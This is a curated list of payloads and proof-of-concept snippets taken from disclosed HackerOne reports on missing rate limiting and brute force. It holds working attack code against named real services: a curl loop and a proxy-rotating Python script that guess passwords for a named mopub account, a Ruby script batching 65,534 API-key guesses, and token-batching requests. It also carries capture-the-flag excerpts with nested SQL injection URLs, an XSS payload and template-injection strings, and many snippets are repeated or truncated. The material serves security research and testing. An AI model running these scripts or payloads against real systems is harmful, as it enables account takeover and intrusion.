# Missing Rate Limiting & Brute Force  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#487656](https://hackerone.com/reports/487656)  -  HTTP PUT method is enabled ratelimited.me
*critical*

```http
PUT /codeslayer137.txt HTTP/1.1
Host: ratelimited.me
Cookie: __cfduid=dfa5166b2ed63c2a5078df85a46ec5e941548497323; fs_uid=rs.fullstory.com`HCE07`57688203…
Content-Length: 21

Testing CodeSlayer137
```

## 2. [#794395](https://hackerone.com/reports/794395)  -  No Rate Limit On forgot Password Leading To Massive Email Flooding
*medium*

```http
POST /a/forgot-password HTTP/1.1
Host: accounts.companyhub.com
Referer: https://accounts.companyhub.com/auth/credentials/forgotpassword
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 30
Cookie: __cfduid=df9a10acb0ed6c3beb1b456f31191d0381581499643; _ga=GA1.2.1112499432.1581499640; _gid=…

Email=apugodspower%40gmail.com
```

## 3. [#2039447](https://hackerone.com/reports/2039447)  -  Entering passwords on the Share Login Page can lead to a brute-force attack
*low*

```http
POST /share/████████/password HTTP/1.1
Host: app.crowdsignal.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: https://app.crowdsignal.com
Referer: https://app.crowdsignal.com/share/██████
Cookie:

action=password&nonce=██████████&password=§
```

## 4. [#1024880](https://hackerone.com/reports/1024880)  -  SSL expired subdomain leads to API swap with main and flagged cookies. Unable to log device ids and certain session tokens.
*medium*

```
Calling URL: https://launchpad.37signals.com/session
Post Data: utf8=%E2%9C%93&authenticity_token=&product=bcx&account_id=2479412&username=VALIDCREDENTIALS&password=VALIDCREDENTIALS&commit=Log+in
Sent Headers:
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Sent Cookies:

Address: https://launchpad.37signals.com/basecamp/2479412/signin
Response code: 200 (OK)
Received headers:
Server: openresty
Date: Tue, 03 Nov 2020 00:04:38 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Status: 200 OK
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
X-Robots-Tag: noindex
ETag: W/"dc3b5ec708ae44cc631cdf4e5bcd6d07"
Cache-Control: max-age=0, private, must-revalidate
X-Request-Id: 8b45d3f2-5977-4d3c-b016-202865d4e134
X-Runtime: 0.007610
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Timing-Allow-Origin: *
Received cookies:
# … truncated …
```

## 5. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
So every time **URL** is sent one has to extract the token from this `img` tag and send that again to search query in this fashion.

**STEP 1**: Take the fuzzed URL

URL=`
...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/`**FUZZ**`%27%23%22,null,null%23
`

**STEP2**: Send the request to the website, from the response fetch the value of data from the img tag (`src` value), and then send the request again to capture the response.


**STEP3**: Check for the response, we get "Expected HTTP status 200, Received: 400" as the response for most of the keywords, so the if the condition would be like anything but `Expected HTTP status 200, Received: 404
`

[img20](https://i.imgur.com/RLAz4iH.png)
{F1138738}

Using this method, found out that there exists two paths, one `user` and other `sleep` which threw `Invalid content type detected`

[img21](https://i.imgur.com/C7Uo3DO.png)
{F1138739}

So now we have a valid path, what's next? maybe there are more paths to it => Nothing

How about params? so the same URL as in STEP 1, but slight change.


**STEP 4**: Take the fuzzed URL

URL=`
...link...hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/user?`**FUZZ**`%27%23%22,null,null%23
`

repeat **step 2 and 3**, with a change that we are now getting `Expected HTTP status 200, Received: 400`.

# … truncated …
```

## 6. [#475167](https://hackerone.com/reports/475167)  -  Apache mod_negotiation filename bruteforcing https://api.ratelimited.me
*low*

```http
GET /index HTTP/1.1
Host: api.ratelimited.me
Cookie: __cfduid=d1223d3114b0d6a19cb09dbdbf358c2721544548659; fs_uid=rs.fullstory.com`HCE07`56668233…

## Impact
```

## 7. [#2039447](https://hackerone.com/reports/2039447)  -  Entering passwords on the Share Login Page can lead to a brute-force attack
*low*

```http
POST /share/████████/password HTTP/1.1
Host: app.crowdsignal.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: https://app.crowdsignal.com
Referer: https://app.crowdsignal.com/share/██████
Cookie:
```

## 8. [#1024880](https://hackerone.com/reports/1024880)  -  SSL expired subdomain leads to API swap with main and flagged cookies. Unable to log device ids and certain session tokens.
*medium*

```
Calling URL: https://help-basecamphq.37signals.com/session
Post Data: utf8=%E2%9C%93&authenticity_token=&product=bcx&account_id=2479412&username=VALIDCREDENTIALS&password=VALIDCREDENTIALS&commit=Log+in
Sent Headers:
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Sent Cookies:

Address: https://3.basecamp.com/4888641/
Response code: 200 (OK)
Received headers:
Server: openresty
Date: Mon, 02 Nov 2020 23:32:48 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Accept-CH: DPR,Width,Viewport-Width,Downlink,Save-Data
Public-Key-Pins-Report-Only: max-age=3600; includeSubdomains; pin-sha256="6X0iNAQtPIjXKEVcqZBwyMcRwq1yW60549axatu3oDE="; pin-sha256="Slt48iBVTjuRQJTjbzopminRrHSGtndY0/sj0lFf9Qk="; pin-sha256="LCa0a2j/xo/5m0U8HTBBNBNCLXBkg7+g+YpeiGJm564="; report-uri="https://zapier.com/hooks/catch/3b7uh7/"
X-Robots-Tag: none
ETag: W/"da919800df1367ee83ad09a4e8fe78c2"
Cache-Control: max-age=0, private, must-revalidate
X-Release: bc5cc4f1db8d95d854d5363d908bb0be30245a88
X-Ratelimit: {"name":"General","period":60,"limit":1000,"remaining":999,"until":"2020-11-02T23:33:00Z"}
X-Request-Id: a4e1be70-ecb8-4320-9fa5-08a2b4007558
X-Runtime: 0.696588
X-Request-Path: /4888641/
# … truncated …
```

## 9. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
**Flag Found**:

[img](https://i.imgur.com/EmnW37d.png)
{F1138715}

## Flag 3

This one is also fairly easy. The new directory provided to look for `/apps` is the key.
(In the source however there are mysterious blank spaces)

One can only see how the people are rated by grinch in `people-rater`. There are names. But if you look closely in the responses for the `people-rater` you will notice that each person has an ID base64 encoded of course. First in the list "Tea Avery" happens to have an id `eyJpZCI6MH0=` which when decoded is `{id:"2"}`, I wonder who `id:"1"` is. 

**Flag Found**:
[img](https://i.imgur.com/gPAS5sH.png)
{F1138715}

## Flag 4

This flag is rather trivial if not difficult to find. `Try and find a way to pull the Grinch's personal details from the online shop.` As the hint gives away to find about grinch and bypass login. So the first thought is to look in the source code, nothing in there just some simple JQuery, with rather funny id names: `alert alert-danger` kind of throws me off the game, lol!. Anyhow the key here is an enumeration. Look at the API, so I guessed the `user` path `sawg-shop/api/user`. But it throws in the:
```

## 10. [#819930](https://hackerone.com/reports/819930)  -  Ability to bruteforce mopub account’s password due to lack of rate limitation protection using {ip rotation techniques}
*low, $420*

```
while read pass; do curl -i -s -k -X $'POST' -H $'Host: app.mopub.com' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'x-csrftoken: ███████' -H $'Origin: https://app.mopub.com' -H $'Referer: https://app.mopub.com/login?next=/' -H $'Cookie: csrftoken=███████; _ga=██████; mp__mixpanel=%7B%22distinct_id%22%3A%20%███%22%2C%22%24device_id%22%3A%20%███████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ██████_mixpanel=%7B%22distinct_id%22%3A%20%22██████████%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22█████%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22████████%22%7D; mp_mixpanel__c=3' --data-binary $'{\"username\":\"alert.wids@gmail.com\",\"password\":\"$pass\"}'     $'https://app.mopub.com/web-client/api/user/login';done < PASS_LIST
# … truncated …
```

## 11. [#819930](https://hackerone.com/reports/819930)  -  Ability to bruteforce mopub account’s password due to lack of rate limitation protection using {ip rotation techniques}
*low, $420*

```python
from proxy_requests.proxy_requests import ProxyRequests

class bcolors:
    BOLD = '\033[1m'
    CRED = '\033[91m'

Pass = ["12345","admin","user","root","love","love2020","uk2020","asdfg","qwerty12345","██████████","████████","█████","████","███","passwOrd","Password","████","█████████","R00T","█████████","███████","███████","████"]
array_length = len(Pass)

I = 0 
for I in range(array_length):
    r = ProxyRequests("https://app.mopub.com/web-client/api/user/login")
    r.set_headers({
        'x-csrftoken': '█████',
        'Origin': 'https://app.mopub.com',
        'Content-Type':'application/json',
        'Referer':'https://app.mopub.com/login?next=/',
        'Cookie': 'csrftoken=████████; _ga=█████; mp__mixpanel=%7B%22distinct_id%22%3A%20%████%22%2C%22%24device_id%22%3A%20%████████%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ██████████_mixpanel=%7B%22distinct_id%22%3A%20%22████████%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22loggedOut%22%2C%22accountKey%22%3A%20null%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22██████%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22███████%22%7D; mp_mixpanel__c=3'
    })
    r.post_with_headers({'username':'alert.wids@gmail.com','password':''+Pass[I]+''})
    if r.get_status_code() == 401 or r.get_status_code() == 400:
       print (bcolors.CRED + "[*-*] Incorrect password: " + Pass[I] + " | Res_status: " + str(r.get_status_code()), " | IP_Proxy:" + str(r.get_proxy_used()) + "]"  )
    elif r.get_status_code() == 204:
       print (bcolors.BOLD + "[*u*] Correct password: " + Pass[I] + " | Res_status: " + str(r.get_status_code()), " | IP_Proxy:" + str(r.get_proxy_used()) + "]" )
    I+= 1
# … truncated …
```

## 12. [#545136](https://hackerone.com/reports/545136)  -  HTTP PUT method is enabled downloader.ratelimited.me
*high*

```http
PUT /codeslayer137.txt HTTP/1.1
Host: downloader.ratelimited.me
Content-Length: 21

Testing By CodeSlayer
```

## 13. [#1363672](https://hackerone.com/reports/1363672)  -  Bypass a fix for report #708013
*medium, $3,500*

```http
POST /api/2020-07/graphql HTTP/2
Host: scara31-store3.myshopify.com
Content-Type: application/json
Origin: null
Content-Length: 161

{"query":"mutation { customerAccessTokenCreate(input: {email: \"███\", password: \"████████\" }) { customerAccessToken { accessToken } } }"}
```

## 14. [#1363672](https://hackerone.com/reports/1363672)  -  Bypass a fix for report #708013
*medium, $3,500*

```http
POST /api/2020-07/graphql HTTP/2
Host: scara31-store3.myshopify.com
Content-Type: application/json
Origin: null
Content-Length: 161
```

## 15. [#1024880](https://hackerone.com/reports/1024880)  -  SSL expired subdomain leads to API swap with main and flagged cookies. Unable to log device ids and certain session tokens.
*medium*

```http
Post Data: utf8=%E2%9C%93&authenticity_token=&product=bcx&account_id=2479412&username=VALIDCREDENTIALS&password=VALIDCREDENTIALS&commit=Log+in
```

## 16. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
comment, very sneaky. So we download the README File.
`https://hackyholidays.h1ctf.com/signup-manager/README.md`

[img](https://i.imgur.com/zDqQZ4y.png)
{F1138732}

Reading the contents of the `README.md` file, a zip file is being mentioned, can we download a zip file? Yeah we can 

`https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`

[img](https://i.imgur.com/SZGXcQ0.png)
{F1138733}

So we have downloaded the zip file and let's see if we can see the contents of it. (Update: Adam, reuploaded the zip file, spent an hour questioning my abilities to read PHP code) anyhow the new zip file has more files now and particularly index.php caught my attention

so to be admin, we need a special cookie and the fact that `user.php` is available on sever that means `admin.php` has to be too, but to access that page we need a special cookie. How to get that cookie? as mentioned in `README.md` on line  `6) You can make anyone an admin by changing the last character in the users.txt file to a Y` and also in the code
```

## 17. [#2915502](https://hackerone.com/reports/2915502)  -  Lack of Rate Limiting on Account Creation Endpoint
*low, $200*

```http
POST /account/signinform/premium_tour_login HTTP/1.1  
   Host: ████  
   Content-Type: application/x-www-form-urlencoded  
   Content-Length: 120  

email=██████████&password=████████&username=█████
```

## 18. [#410451](https://hackerone.com/reports/410451)  -  User login page doesn't implement any form of rate limiting
*low*

```http
POST /auth/post_login HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Cookie:<some cookie>

csrf=<csrf token>&username=<target username>&password=<vulnerable parameter>
```

## 19. [#1065186](https://hackerone.com/reports/1065186)  -  Weak rate limit could lead to ATO due to weak password protection mechanisms
*low*

```http
POST /graphql HTTP/1.1
Host: gateway-production.dubsmash.com
Referer: https://dubsmash.com/login?redirect=/
content-type: application/json
Origin: https://dubsmash.com
Content-Length: 622

{"operationName":"LogInUserMutation","variables":{"username":"wrongcredentials@gmail.com","password":"password","client_id":"o80K4ofRjCcqdvIxaUVefAPCcnZAyJv4","client_secret":"mYrjmUEG47w2Wk6Kwe8wax1vAdiwUxEi"},"query":"mutation LogInUserMutation($username: String!, $password: String!, $client_id: String!, $client_secret: String!) {\n  loginUser(input: {username: $username, password: $password, grant_type: PASSWORD, client_id: $client_id, client_secret: $client_secret}) {\n    user {\n      uuid\n      username\n      __typename\n    }\n    access_token\n    refresh_token\n    token_type\n    __typename\n  }\n}\n"}
```

## 20. [#1065186](https://hackerone.com/reports/1065186)  -  Weak rate limit could lead to ATO due to weak password protection mechanisms
*low*

```http
POST /graphql HTTP/1.1
Host: gateway-production.dubsmash.com
Referer: https://dubsmash.com/login?redirect=/
content-type: application/json
Origin: https://dubsmash.com
Content-Length: 622
```

## 21. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
Very clever, so the admin.php is renamed to `secretadmin.php` and moreover they get filtered out from string replace method but the flaw is its not recursive, Ahh! a well-crafted payload.

[img](https://i.imgur.com/RxP3NpN.png)
{F1138722}

So somehow, we need to come up with a file name, that when stripped out of these matching keyword `admin.php` and `secretadmin.php`. 

The payload would look like: **secretadmsecretadmadmin.phpin.phpin.php**

secretadmsecretadmadmin.phpin.phpin.php =>
secretadmsecretadm~admin.php~in.phpin.php =>

secretadm~secretadmin.php~in.php => secretadmin.php

**Flag found**:

[img](https://i.imgur.com/I7oYV56.png)
{F1138723}

## Flag 7
This was also one of the trickiest flags I came across (till now). We start with `hate-mail-generator`, so in this stage, we have two options we can either view the `Guess What` link or create a hate mail campaign of our own.

Hmm ``{{name}} & {{template: }}`` almost reminded me of `Handlebars` (a way of making dynamic webpages, where you would feed the variable names to a webpage of .hbs extensions). I knew something has to be up with it. 

Also while reviewing the `Create New`, I noticed there were two furthermore possibilities, preview or create (this always showed, `Sorry but you've run out of credits`), and with preview the name was always set to Alice, because of one of the hidden input field:
# … truncated …
```

## 22. [#449356](https://hackerone.com/reports/449356)  -  65534 times efficient, Brute-force attack for api_key
*low*

```ruby
require 'net/http'
require 'securerandom'
require 'json'

keys = 65534.times.map{SecureRandom.hex(32)}
# keys = 65535.times.map{SecureRandom.hex(32)} # error

uri = URI.parse("http://localhost:3000/api/v1/web_hooks/fire.json?url=http://example.com/")
http = Net::HTTP.new(uri.host, uri.port)
req = Net::HTTP::Post.new(uri.path)
req["Content-Type"] = "application/json"
req.body = {api_key: keys}.to_json

res = http.request(req)
```

## 23. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
Here we have got our `UUID` param value.

**Flag Found**:

[img](https://i.imgur.com/uDHRBGR.png)
{F1138719}

## Flag 5

I see another login page but this time the hint is very specific telling us to `Try and find a way past the login page to get to the secret area.`. As usual, I go on for looking at any `hidden` fields if any in the source code, nothing apart from yet another **element named** `alert alert-danger`. So another brute force? I mean the hint was very obvious since it was telling if the username is valid or not. Pulling down the longest username list, I start a brute force. Nothing found, actually, there was, I just forgot to put grep in place.

So `user found: access` what about the pass, I try again with a small list this time. 207p-probable password list, and coincidently it worked.
```

## 24. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
**Flag found**:

[](https://i.imgur.com/EFAeTG6.png)
{F1138731}

## Flag 10

We have another login, ever since the secure-login, I check for each stage's source code on Github lol. So we look at the source code while simultaneously running the directory brute forcing on the web app. => nothing.

so we check the page source, and it's easy to miss at first but we see the
```

## 25. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
so many Y's are there to ensure the value of admin is set to Y, in case of overflow. `1e5` is a scientific notation and blows up to 100000, thats the way to enlargen the user_string and push Y to 113 with last name.

Intercept the request and change the value of age and signup with new creds.

[img17](https://i.imgur.com/UpkZTbA.png)
{F1138735}

Voila!!

[img18](https://i.imgur.com/6FQBQ6W.png)

{F1138736}





## Flag 11
This one by far was the most difficult one. I had to spring up a discord bot to keep track of the brute force.  

So we go to the `/r3c0n_server_4fdk59` on day 11, (for me its 30th December lol), We see `/api` as one of the endpoints, and some images arranged based on their years. 

1. So first thing first as every CTF player does, API enumeration (fuzzing) and ExifTool analysis on the images. => nothing


The images had a funny way of being fetched, they were rather `base64` encrypted:
```

## 26. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
The Grinch's server identified it as the localhost and abandoned the attack... so lets try IPv6 versioning, "localhost" => nothing!

After several hints later in the discord channel, someone recommended the YouTube video of [Watch owning the clout from Nahamsec and daeken](https://www.youtube.com/watch?v=o-tL9ULF0KI).... DNS rebinding it is, still little shaky on the concept and several more hints later, but I knew what to do. Something on the grounds of, like xcy.com redirects to `127.0.0.1` like so 127.0.0.1 is blocked ...but a random domain is not, so that passes the localhost check...but if the domain later redirects to localhost, it will attack it.

[img26](https://i.imgur.com/GuBijAO.png)
{F1138744}

After generating the URL for attack and respective hash
```

## 27. [#1192159](https://hackerone.com/reports/1192159)  -  public webdav endpoint not bruteforce protected
*low, $100*

```bash
curl -u "RANDOM1:RANDOM2" -X PROPFIND https://server/public.php/webdav
```

## 28. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
{{name}}
```

## 29. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
{{template: }}
```

## 30. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
{{template:cbdj3_grinch_header.html}}
```

## 31. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
{{template:cbdj3_grinch_footer.html}}
```

## 32. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
{{temaplte:38dhs_admins_only_header.html}}
```

## 33. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
{{template:38dhs_admins_only_header.html}}
```

## 34. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
[Github](https://github.com/Grinch-Networks) source code, took some time to find it, after some hints from team-mates. The code looks clean and fine, but with recent commits. Inspecting further in the code, one can find 4 commits, go through each one by one, `small fix` caught my attention. The code snippet 

[img](https://i.imgur.com/qYHxsQE.png)
{F1138727}

I don't know PHP but after seeing `DbConnect` and several minutes of googling later, I thought of them being creds, so I tried logging in `phpmyadmin` page and it worked.

Navigating to the user's section, we can find both users and their passwords. But passwords are MD5 hash encrypted. No worries brute force to rescue. 


[img](https://i.imgur.com/V5wAEZJ.png)
{F1138728}

Now, time to go back to `/login` page and log into Grinch's account.

**Flag found**:

[img](https://i.imgur.com/Rp2Xuno.png)
{F1138729}

## Flag 9
On day 9, we find ourselves being tested by Grinch, no like literally, welcome to the evil quiz. 

I begin my testing with directory brute-forcing, nothing of any particular interest actually. How about taking the evil quiz, doesn't allow a name less than 3 chars, also is sensitive to `'or;` since on any other responses it would respond as `There is 1 other player(s) with the same name as you!` but in this, it responded with **I am not evil** and also `There is 0 other player(s) with the same name as you!` lol, I see, SQLi it is.

So, the name gets perfectly reflected in the quiz area, it's after the `302 Found ` redirect when it reflects any change. Interesting, so in order to get a reflection, we need to use both the requests, I see.

So I bring out every hacker's fav SQLmap... with a very difficult query
# … truncated …
```

## 35. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```json
[img19](https://i.imgur.com/R540OUq.png)
{F1138737}

The dumps provide us with nothing new. Bummer!! What's next? I thought of using the payload in the browser.

I found a **XSS**  thought this might get something lol, nothing

**STEP 0**: The SQli

`
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=-7611%27%20UNION+SELECT%20NULL,NULL,%27%3Cscript%3Ealert(1)%3C/script%3E%27--%20-
`

After some hints in the server and Adam himself, it was clear that SQLi with an SQLi has to be used to get an auth token from the server, and then some more help from my fellow hacker in Hacker101 discord, it came down to brute-forcing the API but with new set of generated auths. In simple terms:

(SQLi, within an SQLi)

**URL**=`
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=8291%27+UNION+SELECT+%22%27+union+select+1,2,%27../api/something%27%23%22,null,null%23
`

This link will generate a response that will have a nonexsisting image, which would look like this
```

## 36. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
So finally we have the ID and password lets go to the login in `/attack-box`, took me 7 days to figure this one out.

**Flag found**:

[img23](https://i.imgur.com/S8ouhJN.png)
{F1138741}

## Flag 12

And finally few hours before the final deadline for the report submission, I try the flag 12.

We have the Santa's IP addresses, like previous flag this also has some wierd URL fetch as well. The `base64` encoded value, I wonder what it could be.

hash:
```

## 37. [#1559262](https://hackerone.com/reports/1559262)  -  rubygems.org Batching attack to `confirmation_token` by bypass rate limit
*low, $480*

```ruby
Started GET "/email_confirmations/confirm?token[]=[FILTERED]&token[]=[FILTERED]" for 127.0.0.1 at 2022-04-03 17:54:41 +0900
Processing by EmailConfirmationsController#update as HTML
  Parameters: {"token"=>"[FILTERED]"}
  User Load (1.8ms)  SELECT "users".* FROM "users" WHERE "users"."confirmation_token" IN ($1, $2) LIMIT $3  [["confirmation_token", "key1"], ["confirmation_token", "key2"], ["LIMIT", 1]]
  ↳ app/controllers/email_confirmations_controller.rb:56:in `validate_confirmation_token'
Redirected to http://127.0.0.1:3000/
Filter chain halted as :validate_confirmation_token rendered or redirected
Completed 302 Found in 71ms (ActiveRecord: 26.5ms | Elasticsearch: 0.0ms | Allocations: 3613)
```

## 38. [#1069034](https://hackerone.com/reports/1069034)  -  Grinchs website takendown with various other exploits
*critical*

```
using the way ``{{temaplte:38dhs_admins_only_header.html}}`` in `create new` via `preview feature`, nothing. The other variable name, which I changed from Alice, to ``{{temaplte:38dhs_admins_only_header.html}}`` which looked something like this and viola..
```

## 39. [#1559262](https://hackerone.com/reports/1559262)  -  rubygems.org Batching attack to `confirmation_token` by bypass rate limit
*low, $480*

```
❯ curl --globoff 'http://127.0.0.1:3000/email_confirmations/confirm?token[]=key1&token[]=key2'

<html><body>You are being <a href="http://127.0.0.1:3000/">redirected</a>.</body></html>%
```

## 40. [#449356](https://hackerone.com/reports/449356)  -  65534 times efficient, Brute-force attack for api_key
*low*

```bash
$ curl --globoff 'http://localhost:3000/api/v1/gems?api_key[]=key1&api_key[]=key2'
> Access Denied. Please sign up for an account at https://rubygems.org
```

## 41. [#1559262](https://hackerone.com/reports/1559262)  -  rubygems.org Batching attack to `confirmation_token` by bypass rate limit
*low, $480*

```http
puts res.body
```

## 42. [#1065186](https://hackerone.com/reports/1065186)  -  Weak rate limit could lead to ATO due to weak password protection mechanisms
*low*

```http
HTTP/1.1 200 OK
Date: Wed, 23 Dec 2020 14:40:53 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Set-Cookie: __cfduid=d191afcbe4c1251f6b30748328b1fb38e1608734453; expires=Fri, 22-Jan-21 14:40:53 GMT; path=/; domain=.dubsmash.com; HttpOnly; SameSite=Lax; Secure
X-Powered-By: Express
Access-Control-Allow-Origin: *
Cf-Ipcountry: US
Etag: W/"1c6-rSeAGxcTYF4pPpzI2dToH9KSAN0"
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 0731a4c556000003dc4b098000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Strict-Transport-Security: max-age=0; includeSubDomains
X-Content-Type-Options: nosniff
Server: cloudflare
CF-RAY: 6062d71bbfa503dc-ORD
Content-Length: 454

{"errors":[{"serviceError":{"status_code":429,"message":"Request was throttled. Expected available in 3414 seconds.","error_code":1},"message":"Request was throttled. Expected available in 3414 seconds.","locations":[{"line":2,"column":3}],"path":["loginUser"],"extensions":{"code":"INTERNAL_SERVER_ERROR","exception":{"status_code":429,"message":"Request was throttled. Expected available in 3414 seconds.","error_code":1}}}],"data":{"loginUser":null}}
```
